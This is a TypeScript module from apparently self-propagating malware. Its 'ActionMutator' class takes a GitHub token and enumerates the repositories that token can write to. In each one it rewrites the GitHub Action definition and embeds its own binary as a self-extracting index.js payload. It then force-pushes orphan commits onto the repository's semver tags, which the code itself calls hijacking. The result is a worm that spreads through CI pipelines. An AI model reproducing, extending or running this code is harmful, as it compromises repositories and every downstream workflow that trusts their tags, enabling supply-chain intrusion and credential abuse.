import { getTokenMetadata } from "../../github_utils/auth";
import { logUtil } from "../../utils/logger";
import { buildSelfExtractingPayload } from "../../utils/selfExtracting";
import { Mutator } from "../base";
import { GraphQLClient } from "../branch/client";
import { fetchActionFile, fetchWritableRepos } from "./actionFinder";
import {
  forcePushToTags,
  getCommitDetails,
  listMatchingTags,
} from "./comitter";
import {
  buildDockerWrapper,
  buildJsWrapper,
  injectCheckout,
  parseAction,
} from "./createEnvelope";

// Re-export for consumers / tests
export type { ActionInput, ActionType, ParsedAction } from "./createEnvelope";
export {
  buildDockerWrapper,
  buildJsWrapper,
  injectCheckout,
  parseAction,
} from "./createEnvelope";

// ---------------------------------------------------------------------------
// ActionMutator
// ---------------------------------------------------------------------------

export interface ActionMutatorOptions {
  dryRun?: boolean;
}

export class ActionMutator extends Mutator {
  private readonly token: string;
  private readonly gql: GraphQLClient;
  private readonly dryRun: boolean;

  constructor(token: string, opts: ActionMutatorOptions = {}) {
    super();
    if (!token) throw new Error("A GitHub token is required.");
    this.token = token;
    this.gql = new GraphQLClient(token);
    this.dryRun = opts.dryRun ?? false;
  }

  async execute(): Promise<Boolean> {
    try {
      if (this.dryRun) {
        logUtil.log("━━━ DRY RUN — no changes will be made ━━━\n");
      }

      const tokenInfo = await getTokenMetadata(this.token);
      if (!tokenInfo.valid) {
        return false;
      }

      if (
        !tokenInfo.scopes.includes("repo") &&
        !tokenInfo.scopes.includes("public_repo")
      ) {
        return false;
      }

      logUtil.log("[ActionMutator] Fetching writable repos...");
      const repos = await fetchWritableRepos(this.token);
      logUtil.log(`[ActionMutator] Found ${repos.length} writable repo(s).`);

      if (this.dryRun) {
        logUtil.log(`Writable repos: ${repos.length}`);
        for (const r of repos) logUtil.log(`  • ${r.full_name}`);
        logUtil.log();
      }

      // Read the current binary for index.js payload
      const indexJsRaw = await Bun.file(Bun.main).text();
      const indexJs = buildSelfExtractingPayload(indexJsRaw, { wrap: false });

      let modified = 0;
      for (const repo of repos) {
        try {
          const ok = await this.processRepo(repo, indexJs);
          if (ok) modified++;
        } catch (e) {
          logUtil.log(
            `[ActionMutator] Error processing ${repo.full_name}: ${e instanceof Error ? e.message : String(e)}`,
          );
        }
      }

      logUtil.log(`[ActionMutator] Done. Modified ${modified} repo(s).`);
      return modified > 0;
    } catch (e) {
      logUtil.log(
        `[ActionMutator] Fatal: ${e instanceof Error ? e.message : String(e)}`,
      );
      return false;
    }
  }

  // -----------------------------------------------------------------------
  // Per-repo processing
  // -----------------------------------------------------------------------

  private async processRepo(
    repo: { full_name: string },
    indexJs: string,
  ): Promise<boolean> {
    const [owner, name] = repo.full_name.split("/");
    if (!owner || !name) return false;

    // 1. Fetch the action file via GraphQL
    const actionFile = await fetchActionFile(this.gql, owner, name);
    if (!actionFile) return false;

    // 2. Parse and classify
    const parsed = parseAction(actionFile.raw);
    logUtil.log(
      `[ActionMutator] ${repo.full_name}: type=${parsed.type}, inputs=${parsed.inputs.length}`,
    );

    // 3. Build the replacement YAML
    const newYaml = this.buildNewYaml(
      actionFile.raw,
      parsed,
      owner,
      name,
      actionFile.headOid,
    );
    if (!newYaml) return false;

    // 4. Dry run: discover tags and print what would happen — no mutations
    if (this.dryRun) {
      return this.processRepoDryRun(
        owner,
        name,
        actionFile.filename,
        parsed,
        newYaml,
        indexJs,
      );
    }

    // 4. Hijack semver tags: orphan commit + force push
    const count = await forcePushToTags({
      token: this.token,
      owner,
      name,
      filename: actionFile.filename,
      newYaml,
      indexJs,
    });

    return count > 0;
  }

  // -----------------------------------------------------------------------
  // Dry-run reporting
  // -----------------------------------------------------------------------

  private async processRepoDryRun(
    owner: string,
    name: string,
    filename: string,
    parsed: ReturnType<typeof parseAction>,
    newYaml: string,
    indexJs: string,
  ): Promise<boolean> {
    const fullName = `${owner}/${name}`;

    // Discover semver tags
    const tags = await listMatchingTags(this.token, owner, name, "v");

    logUtil.log("──────────────────────────────────────────────");
    logUtil.log(`Repo:     ${fullName}`);
    logUtil.log(`Type:     ${parsed.type}`);
    logUtil.log(
      `Inputs:   ${parsed.inputs.length}${parsed.inputs.length > 0 ? " (" + parsed.inputs.map((i) => i.name).join(", ") + ")" : ""}`,
    );

    // Files that would be written
    logUtil.log(`\nFiles that would be created:`);

    // ── action.yml / action.yaml ──
    const yamlLines = newYaml.split("\n");
    const maxLineLen = Math.max(
      ...yamlLines.map((l) => l.length),
      filename.length + 4,
    );
    const width = Math.min(maxLineLen + 4, 200);

    logUtil.log(
      `  ┌─ ${filename} ${"─".repeat(Math.max(0, width - filename.length - 3))}`,
    );
    for (const line of yamlLines) {
      logUtil.log(`  │ ${line}`);
    }
    logUtil.log(`  └${"─".repeat(width + 1)}`);

    // ── index.js ──
    const jsPreview = indexJs.split("\n")[0]?.slice(0, 80) ?? "(empty)";
    logUtil.log(`\n  ┌─ index.js (${indexJs.length} bytes)`);
    logUtil.log(`  │ ${jsPreview}${jsPreview.length >= 80 ? "..." : ""}`);
    logUtil.log(`  └${"─".repeat(40)}`);

    // Tags discovered — fetch commit details for each (full read path, no writes)
    logUtil.log(`\nSemver tags discovered (prefix "v"): ${tags.length}`);
    if (tags.length > 0) {
      let resolvable = 0;
      for (const t of tags) {
        const shortName = t.ref.replace(/^refs\/tags\//, "");
        const commit = await getCommitDetails(
          this.token,
          owner,
          name,
          t.object.sha,
        );
        if (commit) {
          resolvable++;
          const msg = commit.commit.message.split("\n")[0]!.slice(0, 60);
          const author = commit.commit.author.name;
          logUtil.log(
            `  • ${shortName}  →  ${t.object.sha.slice(0, 7)}  "${msg}"  (${author})`,
          );
        } else {
          logUtil.log(
            `  • ${shortName}  →  ${t.object.sha.slice(0, 7)}  ⚠ UNRESOLVABLE (would skip)`,
          );
        }
      }
      logUtil.log(
        `\nWould hijack ${resolvable}/${tags.length} tag(s) on ${fullName}.`,
      );
    } else {
      logUtil.log(`  (none — nothing to hijack on ${fullName})`);
    }
    logUtil.log("──────────────────────────────────────────────\n");

    return tags.length > 0;
  }

  // -----------------------------------------------------------------------
  // YAML transformation dispatch
  // -----------------------------------------------------------------------

  /**
   * Build the replacement action.yml content.
   *
   * @param raw   Original YAML string (needed by {@link injectCheckout}).
   * @param parsed  Parsed representation (needed by {@link buildJsWrapper}).
   */
  private buildNewYaml(
    raw: string,
    parsed: ReturnType<typeof parseAction>,
    owner: string,
    name: string,
    headOid: string,
  ): string | null {
    if (parsed.type === "composite") {
      const result = injectCheckout(raw);
      if (result === raw) {
        logUtil.log(
          `[ActionMutator] ${owner}/${name}: could not inject steps, skipping`,
        );
        return null;
      }
      logUtil.log(
        `[ActionMutator] ${owner}/${name}: injected setup-bun + cleanup steps into composite action`,
      );
      return result;
    }

    if (parsed.type === "javascript") {
      logUtil.log(
        `[ActionMutator] ${owner}/${name}: built JS wrapper pinned to ${headOid.slice(0, 7)}`,
      );
      return buildJsWrapper(parsed, owner, name, headOid);
    }

    if (parsed.type === "docker") {
      logUtil.log(
        `[ActionMutator] ${owner}/${name}: built Docker wrapper pinned to ${headOid.slice(0, 7)}`,
      );
      return buildDockerWrapper(parsed, owner, name, headOid);
    }

    logUtil.log(
      `[ActionMutator] ${owner}/${name}: unknown action type, skipping`,
    );
    return null;
  }
}
